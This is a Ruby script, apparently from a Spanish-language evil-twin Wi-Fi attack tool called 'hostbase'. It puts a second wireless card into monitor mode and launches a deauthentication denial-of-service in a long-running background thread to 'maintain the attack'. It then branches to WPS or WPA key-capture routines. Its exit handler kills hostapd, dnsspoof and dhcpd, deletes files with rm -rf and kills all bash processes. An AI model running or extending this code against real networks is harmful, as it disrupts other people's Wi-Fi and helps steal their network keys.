#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'
require './wpsberate'
require './cle'


trap "SIGINT" do
  puts "\e[1;94m[*] Exit... limpieza de ficheros...\e[0m"
sleep 3
Dir.chdir '/tmp/hostbase-1.5ES'
sleep 1
if File.exist?("cartef.txt")
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`killall hostapd`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
`killall dhcpd`
`killall wash`
`killall bash`
`killall wpa_supplicant`
Dir.chdir '/tmp/hostbase-1.5ES'
sleep 1
`rm -rf *.pid`
File.open("cartef.txt").readlines.each do |cartef|
   puts cartef
$cartef = cartef.chomp
File.open("cartebis.txt").readlines.each do |cartebis|
   puts cartebis
$cartebis = cartebis.chomp
puts "Vuelta a la normal de las interfaz wifi..."
`ifconfig #{$cartef} down`
`iw dev #{$cartef} set type managed`
sleep 2
`ip link set #{$cartef} up`
         sleep 2
`ifconfig #{$cartebis} down`
`iw dev #{$cartebis} set type managed`
sleep 2
`ip link set #{$cartebis} up`
         sleep 2         
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
`rm -rf /var/lib/dhcp/dhcpd.leases`
`rm -rf *.txt`
puts "Bye..."
exit
end
end
else
`rm -rf *.pid`
`killall wpa_supplicant`
`killall berate_ap`
`killall hostapd-mana`
`killall wash`
Dir.chdir '/tmp/hostbase-1.5ES'
sleep 1
`rm -rf *.pid`
`rm -rf *.txt`
puts "Vuelta a la normal de las interfaz wifi..."
`killall berate_ap`
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
sleep 1
`iw dev wlan1 set type managed`
sleep 2
`ip link set wlan1 up`
         sleep 5
`systemctl enable NetworkManager.service`
sleep 4
`systemctl start NetworkManager.service`
sleep 5
`rm -rf /var/lib/dhcp/dhcpd.leases`
`killall wash`
`killall bash`
puts "Bye..."
exit
end
end


class Selection
def self.interface
load 'accessdos.rb'
puts "Iniciando la segunda tarjeta wifi en modo monitor..."
system "ip link set #{$cartedos} down"
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
Selection.activeDos
end

def self.activeDos
puts "Iniciando la DoS..."
dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Selection.cleouWps  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.cleouWps
if File.read('page.txt').include?('wps')
puts "Fonction wps"
Selection.victimeattente
else
puts "Fonction clé"
Cle.clewpa
end
end
end
